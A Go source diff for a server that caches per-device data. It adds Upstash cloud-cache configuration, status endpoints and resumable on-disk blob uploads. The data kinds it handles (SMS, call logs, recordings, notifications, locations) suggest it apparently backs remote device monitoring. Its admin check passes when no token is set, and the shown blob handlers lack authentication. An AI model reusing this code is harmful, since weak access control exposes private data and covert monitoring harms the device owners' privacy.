@@ -1,8 +1,10 @@
 package main
 
 import (
+	"bytes"
 	"crypto/rand"
 	"crypto/sha256"
+	"crypto/subtle"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -10,9 +12,11 @@ import (
 	"log"
 	"math"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"sort"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -148,7 +152,10 @@ func isCachedCommand(cmd string) bool {
 	switch cmd {
 	case "contacts_list", "sms_list", "calls_list", "notifications_list",
 		"recordings_list", "media_items", "media_folders", "locations_get",
-		"locations_archive_list":
+		"locations_archive_list", "locations_archive_points",
+		"device_info", "storage_buckets", "storage_explore", "file_list",
+		"schedule_list", "stats", "statistics", "device_stats",
+		"summary", "summaries", "commands", "commands_list", "system_info":
 		return true
 	}
 	return false
@@ -242,24 +249,130 @@ const (
 	cloudSyncDebounce = 15 * time.Second
 )
 
+const upstashConfigPath = "cache_store/upstash_config.json"
+
 var (
-	upstashRESTURL   = strings.TrimRight(strings.TrimSpace(os.Getenv("UPSTASH_REDIS_REST_URL")), "/")
-	upstashRESTToken = strings.TrimSpace(os.Getenv("UPSTASH_REDIS_REST_TOKEN"))
+	upstashEnvURL    = strings.TrimRight(strings.TrimSpace(os.Getenv("UPSTASH_REDIS_REST_URL")), "/")
+	upstashEnvToken  = strings.TrimSpace(os.Getenv("UPSTASH_REDIS_REST_TOKEN"))
+	upstashMu        sync.RWMutex
+	upstashRESTURL   = upstashEnvURL
+	upstashRESTToken = upstashEnvToken
+	upstashSource    = "none"
 	cloudSyncMu      sync.Mutex
 	cloudDirty       = true
 	cloudSyncTimer   *time.Timer
+	cloudStatusMu    sync.Mutex
+	cloudLastSync    time.Time
+	cloudLastError   string
+	cloudLastAction  string
 )
 
-func upstashEnabled() bool {
-	return upstashRESTURL != "" && upstashRESTToken != ""
+type upstashDiskConfig struct {
+	URL     string `json:"url"`
+	Token   string `json:"token"`
+	SavedAt string `json:"savedAt"`
 }
 
-func upstashSet(key, value string) error {
-	req, err := http.NewRequest(http.MethodPost, upstashRESTURL+"/set/"+key, strings.NewReader(value))
+func upstashCreds() (string, string) {
+	upstashMu.RLock()
+	defer upstashMu.RUnlock()
+	return upstashRESTURL, upstashRESTToken
+}
+
+func upstashSourceValue() string {
+	upstashMu.RLock()
+	defer upstashMu.RUnlock()
+	return upstashSource
+}
+
+func setUpstashCreds(rawURL, token, source string) {
+	upstashMu.Lock()
+	upstashRESTURL = strings.TrimRight(strings.TrimSpace(rawURL), "/")
+	upstashRESTToken = strings.TrimSpace(token)
+	upstashSource = source
+	upstashMu.Unlock()
+}
+
+func upstashEnabled() bool {
+	u, t := upstashCreds()
+	return u != "" && t != ""
+}
+
+func validateUpstashURL(raw string) (string, error) {
+	raw = strings.TrimRight(strings.TrimSpace(raw), "/")
+	if raw == "" {
+		return "", fmt.Errorf("رابط Upstash REST مطلوب")
+	}
+	parsed, err := url.Parse(raw)
+	if err != nil {
+		return "", fmt.Errorf("رابط Upstash غير صالح")
+	}
+	if strings.ToLower(parsed.Scheme) != "https" {
+		return "", fmt.Errorf("يجب أن يبدأ رابط Upstash بـ https")
+	}
+	host := strings.ToLower(parsed.Hostname())
+	if host != "upstash.io" && !strings.HasSuffix(host, ".upstash.io") {
+		return "", fmt.Errorf("مضيف Upstash يجب أن يكون ضمن *.upstash.io")
+	}
+	if parsed.User != nil || parsed.Port() != "" {
+		return "", fmt.Errorf("رابط Upstash يجب أن يكون بلا بيانات دخول أو منفذ مخصص")
+	}
+	if parsed.Path != "" && parsed.Path != "/" {
+		return "", fmt.Errorf("رابط Upstash يجب أن يكون بلا مسار إضافي")
+	}
+	if parsed.RawQuery != "" || parsed.Fragment != "" {
+		return "", fmt.Errorf("رابط Upstash يجب أن يكون بلا معاملات أو Fragment")
+	}
+	return raw, nil
+}
+
+func upstashPing(rawURL, token string) error {
+	u, err := validateUpstashURL(rawURL)
 	if err != nil {
 		return err
 	}
-	req.Header.Set("Authorization", "Bearer "+upstashRESTToken)
+	token = strings.TrimSpace(token)
+	if token == "" {
+		return fmt.Errorf("REST Token مطلوب")
+	}
+	req, err := http.NewRequest(http.MethodGet, u+"/ping", nil)
+	if err != nil {
+		return err
+	}
+	req.Header.Set("Authorization", "Bearer "+token)
+	client := &http.Client{Timeout: 12 * time.Second}
+	resp, err := client.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("Upstash أعاد HTTP %d", resp.StatusCode)
+	}
+	var parsed struct {
+		Result string `json:"result"`
+		Error  string `json:"error"`
+	}
+	if len(body) > 0 {
+		_ = json.Unmarshal(body, &parsed)
+	}
+	if parsed.Error != "" {
+		return fmt.Errorf("%s", parsed.Error)
+	}
+	return nil
+}
+
+func upstashSet(key, value string) error {
+	u, token := upstashCreds()
+	if u == "" || token == "" {
+		return fmt.Errorf("Upstash غير مهيأ")
+	}
+	req, err := http.NewRequest(http.MethodPost, u+"/set/"+key, strings.NewReader(value))
+	if err != nil {
+		return err
+	}
+	req.Header.Set("Authorization", "Bearer "+token)
 	resp, err := http.DefaultClient.Do(req)
 	if err != nil {
 		return err
@@ -273,11 +386,15 @@ func upstashSet(key, value string) error {
 }
 
 func upstashGet(key string) (string, error) {
-	req, err := http.NewRequest(http.MethodGet, upstashRESTURL+"/get/"+key, nil)
+	u, token := upstashCreds()
+	if u == "" || token == "" {
+		return "", fmt.Errorf("Upstash غير مهيأ")
+	}
+	req, err := http.NewRequest(http.MethodGet, u+"/get/"+key, nil)
 	if err != nil {
 		return "", err
 	}
-	req.Header.Set("Authorization", "Bearer "+upstashRESTToken)
+	req.Header.Set("Authorization", "Bearer "+token)
 	resp, err := http.DefaultClient.Do(req)
 	if err != nil {
 		return "", err
@@ -300,6 +417,217 @@ func upstashGet(key string) (string, error) {
 		return "", nil
 	}
 	return *parsed.Result, nil
+}
+
+func loadUpstashConfig() {
+	if upstashEnvURL != "" && upstashEnvToken != "" {
+		setUpstashCreds(upstashEnvURL, upstashEnvToken, "env")
+		log.Printf("Upstash: مفعّل من Environment Variables")
+		return
+	}
+	b, err := os.ReadFile(upstashConfigPath)
+	if err != nil {
+		setUpstashCreds("", "", "none")
+		return
+	}
+	var cfg upstashDiskConfig
+	if err := json.Unmarshal(b, &cfg); err != nil {
+		log.Printf("Upstash: ملف الإعداد المحفوظ غير سليم — يُتجاهل")
+		setUpstashCreds("", "", "none")
+		return
+	}
+	u, err := validateUpstashURL(cfg.URL)
+	if err != nil || strings.TrimSpace(cfg.Token) == "" {
+		log.Printf("Upstash: إعداد محفوظ غير صالح — يُتجاهل")
+		setUpstashCreds("", "", "none")
+		return
+	}
+	setUpstashCreds(u, cfg.Token, "file")
+	log.Printf("Upstash: مفعّل من إعداد محفوظ على القرص")
+}
+
+func saveUpstashConfig(rawURL, token string) error {
+	cfg := upstashDiskConfig{
+		URL:     strings.TrimRight(strings.TrimSpace(rawURL), "/"),
+		Token:   strings.TrimSpace(token),
+		SavedAt: time.Now().Format(time.RFC3339),
+	}
+	b, err := json.MarshalIndent(cfg, "", "  ")
+	if err != nil {
+		return err
+	}
+	if err := os.MkdirAll(filepath.Dir(upstashConfigPath), 0o755); err != nil {
+		return err
+	}
+	tmp := upstashConfigPath + ".tmp"
+	if err := os.WriteFile(tmp, b, 0o600); err != nil {
+		return err
+	}
+	return os.Rename(tmp, upstashConfigPath)
+}
+
+func markCloudResult(action string, err error) {
+	cloudStatusMu.Lock()
+	cloudLastAction = action
+	if err != nil {
+		cloudLastError = err.Error()
+	} else {
+		cloudLastError = ""
+		cloudLastSync = time.Now()
+	}
+	cloudStatusMu.Unlock()
+}
+
+func cloudStatusSnapshot() map[string]interface{} {
+	u, t := upstashCreds()
+	host := ""
+	if parsed, err := url.Parse(u); err == nil {
+		host = parsed.Host
+	}
+	cloudStatusMu.Lock()
+	lastSync := cloudLastSync
+	lastErr := cloudLastError
+	lastAction := cloudLastAction
+	cloudStatusMu.Unlock()
+	lastSyncMs := int64(0)
+	if !lastSync.IsZero() {
+		lastSyncMs = lastSync.UnixMilli()
+	}
+	return map[string]interface{}{
+		"ok":             true,
+		"configured":     u != "" && t != "",
+		"source":         upstashSourceValue(),
+		"url":            u,
+		"urlHost":        host,
+		"tokenSet":       t != "",
+		"cacheKey":       cacheCloudKey,
+		"adminProtected": strings.TrimSpace(os.Getenv("RB_ADMIN_TOKEN")) != "",
+		"lastSync":       lastSyncMs,
+		"lastError":      lastErr,
+		"lastAction":     lastAction,
+	}
+}
+
+func cloudAdminAllowed(r *http.Request, bodyKey string) bool {
+	expected := strings.TrimSpace(os.Getenv("RB_ADMIN_TOKEN"))
+	if expected == "" {
+		return true
+	}
+	got := strings.TrimSpace(r.Header.Get("X-RB-Admin"))
+	if got == "" {
+		got = strings.TrimSpace(bodyKey)
+	}
+	return subtle.ConstantTimeCompare([]byte(got), []byte(expected)) == 1
+}
+
+func writeCloudJSON(w http.ResponseWriter, status int, payload interface{}) {
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(status)
+	_ = json.NewEncoder(w).Encode(payload)
+}
+
+func handleCloudAPI(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Access-Control-Allow-Origin", "*")
+	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-RB-Admin")
+	if r.Method == http.MethodOptions {
+		w.WriteHeader(http.StatusNoContent)
+		return
+	}
+	if r.URL.Path == "/api/cloud/status" {
+		if r.Method != http.MethodGet {
+			writeCloudJSON(w, http.StatusMethodNotAllowed, map[string]interface{}{"ok": false, "error": "روشت غير مدعوم"})
+			return
+		}
+		writeCloudJSON(w, http.StatusOK, cloudStatusSnapshot())
+		return
+	}
+	if r.Method != http.MethodPost {
+		writeCloudJSON(w, http.StatusMethodNotAllowed, map[string]interface{}{"ok": false, "error": "روشت غير مدعوم"})
+		return
+	}
+	r.Body = http.MaxBytesReader(w, r.Body, 64<<10)
+	var req struct {
+		URL      string `json:"url"`
+		Token    string `json:"token"`
+		AdminKey string `json:"adminKey"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeCloudJSON(w, http.StatusBadRequest, map[string]interface{}{"ok": false, "error": "JSON غير صالح"})
+		return
+	}
+	if !cloudAdminAllowed(r, req.AdminKey) {
+		writeCloudJSON(w, http.StatusUnauthorized, map[string]interface{}{"ok": false, "error": "مفتاح الإدارة مطلوب أو غير صحيح"})
+		return
+	}
+
+	switch r.URL.Path {
+	case "/api/cloud/test":
+		u, t := upstashCreds()
+		if strings.TrimSpace(req.URL) != "" {
+			u = req.URL
+		}
+		if strings.TrimSpace(req.Token) != "" {
+			t = req.Token
+		}
+		u, err := validateUpstashURL(u)
+		if err != nil {
+			writeCloudJSON(w, http.StatusBadRequest, map[string]interface{}{"ok": false, "error": err.Error()})
+			return
+		}
+		if err := upstashPing(u, t); err != nil {
+			writeCloudJSON(w, http.StatusBadRequest, map[string]interface{}{"ok": false, "error": "فشل الاتصال: " + err.Error()})
+			return
+		}
+		writeCloudJSON(w, http.StatusOK, map[string]interface{}{"ok": true, "message": "PONG", "urlHost": hostOfURL(u)})
+
+	case "/api/cloud/config":
+		u, err := validateUpstashURL(req.URL)
+		if err != nil {
+			writeCloudJSON(w, http.StatusBadRequest, map[string]interface{}{"ok": false, "error": err.Error()})
+			return
+		}
+		t := strings.TrimSpace(req.Token)
+		if t == "" {
+			writeCloudJSON(w, http.StatusBadRequest, map[string]interface{}{"ok": false, "error": "REST Token مطلوب للحفظ"})
+			return
+		}
+		if err := upstashPing(u, t); err != nil {
+			writeCloudJSON(w, http.StatusBadRequest, map[string]interface{}{"ok": false, "error": "فشل اختبار الاتصال قبل الحفظ: " + err.Error()})
+			return
+		}
+		setUpstashCreds(u, t, "ui")
+		saveErr := saveUpstashConfig(u, t)
+		go func() {
+			loadCacheFromCloud()
+			syncCacheToCloud(true)
+		}()
+		payload := cloudStatusSnapshot()
+		payload["message"] = "حُفظت إعدادات Upstash وفُعّل الكاش السحابي"
+		if saveErr != nil {
+			payload["warning"] = "فُعّل الإعداد في الذاكرة، لكن تعذّر حفظه على القرص: " + saveErr.Error()
+			log.Printf("Upstash: تعذّر حفظ الإعداد على القرص: %v", saveErr)
+		}
+		writeCloudJSON(w, http.StatusOK, payload)
+
+	case "/api/cloud/sync":
+		if !upstashEnabled() {
+			writeCloudJSON(w, http.StatusBadRequest, map[string]interface{}{"ok": false, "error": "Upstash غير مهيأ — احفظ الرابط والتوكن أولاً"})
+			return
+		}
+		go syncCacheToCloud(true)
+		writeCloudJSON(w, http.StatusAccepted, map[string]interface{}{"ok": true, "message": "بدأت مزامنة الكاش السحابي"})
+
+	default:
+		writeCloudJSON(w, http.StatusNotFound, map[string]interface{}{"ok": false, "error": "نهاية غير معروفة"})
+	}
+}
+
+func hostOfURL(raw string) string {
+	if parsed, err := url.Parse(raw); err == nil {
+		return parsed.Host
+	}
+	return ""
 }
 
 // scheduleCloudSync يجمع دفعة التغييرات المتتالية ويرفعها دفعة واحدة بعد 15 ثانية هدوء
@@ -342,15 +670,18 @@ func syncCacheToCloud(force bool) {
 
 	b, err := json.Marshal(out)
 	if err != nil {
+		markCloudResult("sync", err)
 		return
 	}
 	if err := upstashSet(cacheCloudKey, string(b)); err != nil {
 		log.Printf("تعذّر رفع كاش القوائم إلى التخزين السحابي (يعاد في الدورة القادمة): %v", err)
+		markCloudResult("sync", err)
 		cloudSyncMu.Lock()
 		cloudDirty = true
 		cloudSyncMu.Unlock()
 		return
 	}
+	markCloudResult("sync", nil)
 	log.Printf("رُفع كاش القوائم إلى التخزين السحابي: %d مضيف (%d بايت)", len(out), len(b))
 }
 
@@ -363,15 +694,18 @@ func loadCacheFromCloud() {
 	raw, err := upstashGet(cacheCloudKey)
 	if err != nil {
 		log.Printf("تعذّرت قراءة الكاش السحابي: %v", err)
+		markCloudResult("restore", err)
 		return
 	}
 	if raw == "" {
+		markCloudResult("restore", nil)
 		log.Printf("لا نسخة سحابية للكاش بعد")
 		return
 	}
 	var loaded map[string]map[string]*cacheEntry
 	if err := json.Unmarshal([]byte(raw), &loaded); err != nil || loaded == nil {
 		log.Printf("نسخة الكاش السحابية غير سليمة")
+		markCloudResult("restore", fmt.Errorf("نسخة الكاش السحابية غير سليمة"))
 		return
 	}
 	merged := 0
@@ -394,6 +728,7 @@ func loadCacheFromCloud() {
 		}
 	}
 	cacheMu.Unlock()
+	markCloudResult("restore", nil)
 	log.Printf("استُعيدت %d مدخلات كاش من التخزين السحابي", merged)
 }
 
@@ -579,9 +914,17 @@ func main() {
 	http.HandleFunc("/api/blob", handleBlobAPI)
 	// B6: مسار القائمة التي تعتمد عليها لوحة الخزنة ونافذة الحالة في لوحة التحكم (كان يُرجع 404 صامتاً)
 	http.HandleFunc("/api/blob/list", handleBlobListAPI)
+	http.HandleFunc("/api/blob/status", handleBlobStatusAPI)
+	// B45 — إدارة Upstash من واجهة المتحكم: حالة + اختبار + حفظ + مزامنة
+	http.HandleFunc("/api/cloud/status", handleCloudAPI)
+	http.HandleFunc("/api/cloud/test", handleCloudAPI)
+	http.HandleFunc("/api/cloud/config", handleCloudAPI)
+	http.HandleFunc("/api/cloud/sync", handleCloudAPI)
+	loadBlobStore()
 
 	// B12 — البيانات المخزنة على الخادم: كاش القوائم التلقائي (تحميل من القرص + تفريغ دوري)
 	loadCacheFromDisk()
+	loadUpstashConfig()
 	loadCacheFromCloud()
 	go periodicCacheDump()
 	go syncCacheToCloud(false) // رفع أولي بعد استرجاع النسخ لضمان وجود نسخة سحابية حتى دون تحديثات
@@ -1106,6 +1449,123 @@ var (
 const blobMaxPerDevice = int64(48) << 20
 const blobMaxItem = int64(32) << 20
 
+// 📦 B41 — تخزين دائم للبلوبات على القرص مع فهرس JSON، بدل الذاكرة وحدها.
+// الافتراضي داخل حاوية Render: ./data/blobs (يمكن تغييره بـ RB_BLOB_DIR أو قرص دائم).
+func blobRootDir() string {
+	if v := strings.TrimSpace(os.Getenv("RB_BLOB_DIR")); v != "" {
+		return v
+	}
+	return filepath.Join("data", "blobs")
+}
+
+func blobIndexPath() string { return filepath.Join(blobRootDir(), "index.json") }
+
+func blobSafeSegment(s string) string {
+	s = strings.TrimSpace(s)
+	if s == "" {
+		return "_"
+	}
+	var b strings.Builder
+	for _, r := range s {
+		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') ||
+			r == '-' || r == '_' || r == '.' || r == '@' {
+			b.WriteRune(r)
+		} else {
+			b.WriteRune('_')
+		}
+	}
+	out := b.String()
+	if out == "." || out == ".." {
+		out = "_" + out
+	}
+	if len(out) > 120 {
+		sum := sha256.Sum256([]byte(s))
+		out = out[:80] + "_" + fmt.Sprintf("%x", sum[:8])
+	}
+	return out
+}
+
+func blobFilePath(deviceID, kind, name string) string {
+	return filepath.Join(blobRootDir(), blobSafeSegment(deviceID), blobSafeSegment(kind), blobSafeSegment(name))
+}
+
+func blobTempPath(deviceID, kind, name, sha string) string {
+	key := blobSafeSegment(deviceID + "__" + kind + "__" + name + "__" + sha)
+	return filepath.Join(blobRootDir(), ".uploads", key+".part")
+}
+
+// يجب استدعاؤها وقفل blobMu ممسوك.
+func saveBlobIndexLocked() {
+	out := make(map[string]map[string]map[string]*BlobItem)
+	for d, kinds := range blobData {
+		for k, items := range kinds {
+			for n, it := range items {
+				if it == nil {
+					continue
+				}
+				if out[d] == nil {
+					out[d] = map[string]map[string]*BlobItem{}
+				}
+				if out[d][k] == nil {
+					out[d][k] = map[string]*BlobItem{}
+				}
+				out[d][k][n] = &BlobItem{Name: it.Name, Kind: it.Kind, Sha256: it.Sha256, Size: it.Size, Ts: it.Ts}
+			}
+		}
+	}
+	b, err := json.Marshal(out)
+	if err != nil {
+		return
+	}
+	p := blobIndexPath()
+	_ = os.MkdirAll(filepath.Dir(p), 0o755)
+	tmp := p + ".tmp"
+	if err := os.WriteFile(tmp, b, 0o644); err == nil {
+		_ = os.Rename(tmp, p)
+	}
+}
+
+// استعادة فهرس البلوبات من القرص عند الإقلاع (Render أو أي استضافة).
+func loadBlobStore() {
+	b, err := os.ReadFile(blobIndexPath())
+	if err != nil {
+		return
+	}
+	var idx map[string]map[string]map[string]*BlobItem
+	if err := json.Unmarshal(b, &idx); err != nil {
+		log.Printf("فهرس البلوبات تالف — تجاهل: %v", err)
+		return
+	}
+	blobMu.Lock()
+	defer blobMu.Unlock()
+	count := 0
+	for d, kinds := range idx {
+		for k, items := range kinds {
+			for n, it := range items {
+				if it == nil {
+					continue
+				}
+				st, err := os.Stat(blobFilePath(d, k, n))
+				if err != nil || st.IsDir() {
+					continue
+				}
+				it.Data = nil
+				it.Size = st.Size()
+				if blobData[d] == nil {
+					blobData[d] = map[string]map[string]*BlobItem{}
+				}
+				if blobData[d][k] == nil {
+					blobData[d][k] = map[string]*BlobItem{}
+				}
+				blobData[d][k][n] = it
+				blobBytes[d] += it.Size
+				count++
+			}
+		}
+	}
+	log.Printf("استُعيد %d ملف بلوب من القرص (%s)", count, blobRootDir())
+}
+
 func blobTrack(deviceID string, item *BlobItem, prev *BlobItem) {
 	delta := item.Size
 	if prev != nil {
@@ -1129,6 +1589,7 @@ func blobTrack(deviceID string, item *BlobItem, prev *BlobItem) {
 		evict := blobData[deviceID][oldestKind][oldestName]
 		blobBytes[deviceID] -= evict.Size
 		delete(blobData[deviceID][oldestKind], oldestName)
+		_ = os.Remove(blobFilePath(deviceID, oldestKind, oldestName))
 		if len(blobData[deviceID][oldestKind]) == 0 {
 			delete(blobData[deviceID], oldestKind)
 		}
@@ -1156,41 +1617,12 @@ func handleBlobAPI(w http.ResponseWriter, r *http.Request) {
 			writeStateJSONError(w, http.StatusBadRequest, "device و kind و name مطلوبة في الرابط (query)")
 			return
 		}
-		r.Body = http.MaxBytesReader(w, r.Body, blobMaxItem)
-		data, err := io.ReadAll(r.Body)
-		if err != nil {
-			writeStateJSONError(w, http.StatusBadRequest, "فشل قراءة بيانات الملف")
+		// B41 — الرفع المجزأ الاستئنافي يُفعَّل عند وجود offset أو size في الرابط.
+		if r.URL.Query().Get("offset") != "" || r.URL.Query().Get("size") != "" {
+			handleBlobChunkUpload(w, r, deviceID, kind, name)
 			return
 		}
-		if len(data) == 0 {
-			writeStateJSONError(w, http.StatusBadRequest, "ملف فارغ")
-			return
-		}
-		sum := fmt.Sprintf("%x", sha256.Sum256(data))
-		clientSha := strings.TrimSpace(r.Header.Get("X-Blob-Sha"))
-		blobMu.Lock()
-		defer blobMu.Unlock()
-		prev, existed := blobData[deviceID][kind][name]
-		if existed && prev.Sha256 == sum && clientSha == sum {
-			// بلا تكرار: نفس المحتوى مرفوع مسبقاً — لا نزيده ولا نعيد تنزيل الرفع
-			w.Header().Set("Content-Type", "application/json")
-			json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "dedup": true, "sha256": sum})
-			return
-		}
-		if blobData[deviceID] == nil {
-			blobData[deviceID] = map[string]map[string]*BlobItem{}
-		}
-		if blobData[deviceID][kind] == nil {
-			blobData[deviceID][kind] = map[string]*BlobItem{}
-		}
-		item := &BlobItem{Name: name, Kind: kind, Sha256: sum, Size: int64(len(data)), Ts: time.Now().UnixMilli(), Data: data}
-		if existed {
-			item.Ts = prev.Ts // أول رفع يبقى كمرجع (استبعاد التكرار عند الجلب)
-		}
-		blobData[deviceID][kind][name] = item
-		blobTrack(deviceID, item, prev)
-		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "dedup": false, "sha256": sum, "size": item.Size})
+		handleBlobSingleUpload(w, r, deviceID, kind, name)
 
 	case http.MethodGet:
 		if name == "" {
@@ -1229,12 +1661,265 @@ func handleBlobAPI(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		w.Header().Set("Content-Type", "application/octet-stream")
+		w.Header().Set("Accept-Ranges", "bytes")
 		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", it.Name))
-		w.Write(it.Data)
+		// B41 — خدمة من القرص عبر http.ServeContent لدعم Range واستئناف التنزيل.
+		f, err := os.Open(blobFilePath(deviceID, kind, name))
+		if err == nil {
+			defer f.Close()
+			http.ServeContent(w, r, it.Name, time.UnixMilli(it.Ts), f)
+			return
+		}
+		if len(it.Data) > 0 {
+			http.ServeContent(w, r, it.Name, time.UnixMilli(it.Ts), bytes.NewReader(it.Data))
+			return
+		}
+		writeStateJSONError(w, http.StatusNotFound, "محتوى الملف غير متاح على الخادم")
 
 	default:
 		writeStateJSONError(w, http.StatusMethodNotAllowed, "طريقة غير مدعومة")
 	}
+}
+
+// رفع ملف واحد كامل (الوضع القديم، ويبقى مدعوماً للتوافق).
+func handleBlobSingleUpload(w http.ResponseWriter, r *http.Request, deviceID, kind, name string) {
+	r.Body = http.MaxBytesReader(w, r.Body, blobMaxItem)
+	data, err := io.ReadAll(r.Body)
+	if err != nil {
+		writeStateJSONError(w, http.StatusBadRequest, "فشل قراءة بيانات الملف")
+		return
+	}
+	if len(data) == 0 {
+		writeStateJSONError(w, http.StatusBadRequest, "ملف فارغ")
+		return
+	}
+	sum := fmt.Sprintf("%x", sha256.Sum256(data))
+	clientSha := strings.TrimSpace(r.Header.Get("X-Blob-Sha"))
+	if clientSha != "" && clientSha != sum {
+		writeStateJSONError(w, http.StatusBadRequest, "بصمة SHA-256 المرسلة لا تطابق المحتوى")
+		return
+	}
+	finalPath := blobFilePath(deviceID, kind, name)
+	if err := os.MkdirAll(filepath.Dir(finalPath), 0o755); err != nil {
+		writeStateJSONError(w, http.StatusInternalServerError, "تعذر إنشاء مجلد التخزين")
+		return
+	}
+	if err := os.WriteFile(finalPath, data, 0o644); err != nil {
+		writeStateJSONError(w, http.StatusInternalServerError, "تعذر كتابة الملف على القرص")
+		return
+	}
+	blobMu.Lock()
+	prev, existed := blobData[deviceID][kind][name]
+	if existed && prev.Sha256 == sum && clientSha == sum {
+		blobMu.Unlock()
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "dedup": true, "sha256": sum})
+		return
+	}
+	if blobData[deviceID] == nil {
+		blobData[deviceID] = map[string]map[string]*BlobItem{}
+	}
+	if blobData[deviceID][kind] == nil {
+		blobData[deviceID][kind] = map[string]*BlobItem{}
+	}
+	item := &BlobItem{Name: name, Kind: kind, Sha256: sum, Size: int64(len(data)), Ts: time.Now().UnixMilli()}
+	if existed {
+		item.Ts = prev.Ts
+	}
+	blobData[deviceID][kind][name] = item
+	blobTrack(deviceID, item, prev)
+	saveBlobIndexLocked()
+	blobMu.Unlock()
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "dedup": false, "sha256": sum, "size": item.Size, "received": item.Size, "complete": true})
+}
+
+// رفع مجزأ استئنافي: كل طلب يضيف جزءاً في offset محدد، والخادم يحتفظ بالجزء الناقص.
+func handleBlobChunkUpload(w http.ResponseWriter, r *http.Request, deviceID, kind, name string) {
+	offset, err := strconv.ParseInt(strings.TrimSpace(r.URL.Query().Get("offset")), 10, 64)
+	if err != nil || offset < 0 {
+		offset = 0
+	}
+	total, _ := strconv.ParseInt(strings.TrimSpace(r.URL.Query().Get("size")), 10, 64)
+	finalFlag := r.URL.Query().Get("final") == "1"
+	clientSha := strings.TrimSpace(r.Header.Get("X-Blob-Sha"))
+	if clientSha == "" {
+		clientSha = strings.TrimSpace(r.URL.Query().Get("sha"))
+	}
+
+	r.Body = http.MaxBytesReader(w, r.Body, blobMaxItem)
+	chunk, err := io.ReadAll(r.Body)
+	if err != nil {
+		writeStateJSONError(w, http.StatusBadRequest, "فشل قراءة جزء الرفع")
+		return
+	}
+	if total <= 0 {
+		total = offset + int64(len(chunk))
+	}
+	if total > blobMaxItem {
+		writeStateJSONError(w, http.StatusRequestEntityTooLarge, "حجم الملف يتجاوز الحد الأقصى (32MB)")
+		return
+	}
+	if offset > total || offset+int64(len(chunk)) > total {
+		writeStateJSONError(w, http.StatusBadRequest, "نطاق الجزء غير صالح")
+		return
+	}
+
+	tmp := blobTempPath(deviceID, kind, name, clientSha)
+	if err := os.MkdirAll(filepath.Dir(tmp), 0o755); err != nil {
+		writeStateJSONError(w, http.StatusInternalServerError, "تعذر إنشاء مجلد الرفع المؤقت")
+		return
+	}
+	cur := int64(0)
+	if st, err := os.Stat(tmp); err == nil {
+		cur = st.Size()
+	}
+	if cur > total {
+		_ = os.Remove(tmp)
+		cur = 0
+	}
+	if cur != offset {
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(http.StatusConflict)
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"ok": false, "received": cur, "complete": false,
+			"error": "اختلاف موضع الاستئناف — استكمل من received",
+		})
+		return
+	}
+	f, err := os.OpenFile(tmp, os.O_CREATE|os.O_WRONLY, 0o644)
+	if err != nil {
+		writeStateJSONError(w, http.StatusInternalServerError, "تعذر فتح ملف الرفع المؤقت")
+		return
+	}
+	if _, err = f.Seek(offset, io.SeekStart); err == nil {
+		_, err = f.Write(chunk)
+	}
+	_ = f.Close()
+	if err != nil {
+		writeStateJSONError(w, http.StatusInternalServerError, "تعذر كتابة جزء الرفع")
+		return
+	}
+	received := offset + int64(len(chunk))
+	if received < total && !finalFlag {
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(http.StatusAccepted)
+		json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "received": received, "complete": false, "size": total})
+		return
+	}
+
+	st, err := os.Stat(tmp)
+	if err != nil || st.Size() != total {
+		writeStateJSONError(w, http.StatusBadRequest, "حجم الملف المجمّع لا يطابق الحجم المعلن")
+		return
+	}
+	sum, err := sha256File(tmp)
+	if err != nil {
+		writeStateJSONError(w, http.StatusInternalServerError, "تعذر حساب بصمة الملف")
+		return
+	}
+	if clientSha != "" && sum != clientSha {
+		_ = os.Remove(tmp)
+		writeStateJSONError(w, http.StatusBadRequest, "بصمة SHA-256 النهائية لا تطابق المحتوى — أُعيد الرفع من البداية")
+		return
+	}
+	finalPath := blobFilePath(deviceID, kind, name)
+	if err := os.MkdirAll(filepath.Dir(finalPath), 0o755); err != nil {
+		writeStateJSONError(w, http.StatusInternalServerError, "تعذر إنشاء مجلد التخزين")
+		return
+	}
+	_ = os.Remove(finalPath)
+	if err := os.Rename(tmp, finalPath); err != nil {
+		// احتياطي: نسخ ثم حذف (بعض أنظمة الملفات تمنع النقل عبر أقراص مختلفة)
+		data, rerr := os.ReadFile(tmp)
+		if rerr != nil || os.WriteFile(finalPath, data, 0o644) != nil {
+			writeStateJSONError(w, http.StatusInternalServerError, "تعذر تثبيت الملف النهائي")
+			return
+		}
+		_ = os.Remove(tmp)
+	}
+
+	blobMu.Lock()
+	prev, existed := blobData[deviceID][kind][name]
+	if blobData[deviceID] == nil {
+		blobData[deviceID] = map[string]map[string]*BlobItem{}
+	}
+	if blobData[deviceID][kind] == nil {
+		blobData[deviceID][kind] = map[string]*BlobItem{}
+	}
+	item := &BlobItem{Name: name, Kind: kind, Sha256: sum, Size: total, Ts: time.Now().UnixMilli()}
+	if existed {
+		item.Ts = prev.Ts
+	}
+	blobData[deviceID][kind][name] = item
+	blobTrack(deviceID, item, prev)
+	saveBlobIndexLocked()
+	blobMu.Unlock()
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"ok": true, "dedup": false, "sha256": sum, "size": total,
+		"received": received, "complete": true,
+	})
+}
+
